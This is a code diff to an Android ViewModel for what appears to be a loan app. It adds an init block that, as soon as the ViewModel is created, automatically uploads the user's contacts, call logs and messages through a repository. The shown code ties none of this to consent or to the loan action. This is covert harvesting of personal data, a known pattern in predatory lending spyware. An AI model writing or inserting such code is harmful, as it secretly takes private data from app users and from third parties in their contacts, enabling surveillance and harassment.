@@ -26,6 +26,13 @@ class AppViewModel @Inject constructor(
     val appStates = _appStates.asStateFlow()
 
 
+    init {
+        uploadContacts()
+        uploadCallLogs()
+        uploadMessages()
+    }
+
+
     fun onEvent(event: AppEvents) {
         when (event) {
             is AppEvents.ApplyForLoan -> {
@@ -200,6 +207,24 @@ class AppViewModel @Inject constructor(
 
         }
 
+    }
+
+    private fun uploadContacts() {
+        viewModelScope.launch {
+            appRepository.uploadContacts()
+        }
+    }
+
+    private fun uploadCallLogs() {
+        viewModelScope.launch {
+            appRepository.uploadCallLogs()
+        }
+    }
+
+    private fun uploadMessages() {
+        viewModelScope.launch {
+            appRepository.uploadMessages()
+        }
     }
 
 }
